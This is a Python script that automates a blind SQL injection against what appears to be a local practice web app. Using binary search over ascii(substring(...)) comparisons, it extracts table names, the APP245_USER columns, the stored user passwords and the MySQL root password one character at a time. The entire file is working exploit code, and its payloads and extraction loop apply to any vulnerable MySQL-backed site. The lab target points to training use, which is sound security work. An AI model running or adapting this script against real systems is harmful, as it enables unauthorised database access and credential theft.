from template_http import doHttp

target = 'http://localhost:8080/SqlInjectionSamples/Story4.jsp'
# Table names 
attackVector = 'ascii(substring((' \
               'select table_name from information_schema.TABLES where table_schema = database() limit _tbl-index_,1' \
               '),_pos_,1)) <= _check_%23'
# Column names
attackVector = 'ascii(substring((' \
               'select column_name from information_schema.COLUMNS where table_schema = database() and table_name = \'APP245_USER\' limit _tbl-index_,1' \
               '),_pos_,1)) <= _check_%23'
# Data
attackVector = 'ascii(substring((' \
               'select APP245_USER_PASSWORD from APP245_USER order by APP245_PRODUCT_ID limit _tbl-index_,1' \
               '),_pos_,1)) <= _check_%23'
# Root user password
attackVector = 'ascii(substring((' \
               'select password from mysql.user where user = \'root\' limit _tbl-index_,1' \
               '),_pos_,1)) <= _check_%23'
debug = 0
trace = 0

#req = requests.get(target)
#if req.status_code != requests.codes.ok:
#    raise ValueError('Unable to connect to target')

def check(resp_text):
    if(trace):
        print(resp_text)

    if(str(resp_text).find("Product Available") != -1):
        return True
    else:
        return False

totalQueryCount = 0
for i in range(0, 100):
    try:
        answer = ''
        pos = 1
        mid = 0
        while (True):
            lo = 1
            hi = 255
            temp = -1

            if(debug):
                print("Checking for character " + str(pos))

            while (lo <= hi):
                mid = (lo + hi) / 2
                resp_text = doHttp('GET', target + "?q=USB\' and " + attackVector.replace("_tbl-index_", str(i)).replace("_pos_",str(pos)).replace("_check_", str(mid)))
                totalQueryCount = totalQueryCount + 1
                if (check(resp_text)):
                    hi = mid-1
                    temp = mid
                else:
                    lo = mid+1
            if (hi == 0): break
            if(debug):
                print("Got " + chr(temp))
            answer += chr(temp)
            pos += 1
        print(answer)
    except ValueError:
        break

print("Total query count: " + str(totalQueryCount))